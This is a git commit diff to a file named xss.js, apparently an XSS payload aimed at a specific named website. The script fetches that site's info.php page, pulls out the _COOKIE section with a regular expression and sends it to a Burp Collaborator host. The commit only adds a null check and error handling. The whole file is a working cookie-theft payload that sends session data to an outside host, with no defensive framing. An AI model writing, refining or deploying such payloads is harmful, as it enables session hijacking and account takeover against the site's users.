73633ecf2b9d794f03411df9711ee60a282de371
shankar acharya <34772838+5hank4r@users.noreply.github.com>
2025-06-12 10:29:58 +0545

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,6 +1,11 @@
 fetch('https://tatacars.sipradi.com.np/info.php')
   .then(response => response.text())
   .then(text => {
-    cookie = text.match(/_COOKIE.{1,2000}/)[0];
-    fetch('http://aftpmh4i5w0rhzlsh7e5lkya91fr3g.burpcollaborator.net/?cookie=' + encodeURIComponent(cookie));
-  });
+    let cookieMatch = text.match(/_COOKIE.{1,2000}/);
+    if (cookieMatch) {
+      fetch('http://aftpmh4i5w0rhzlsh7e5lkya91fr3g.burpcollaborator.net/?cookie=' + encodeURIComponent(cookieMatch[0]));
+    } else {
+      console.log("No _COOKIE match found");
+    }
+  })
+  .catch(e => console.error("Fetch error:", e));
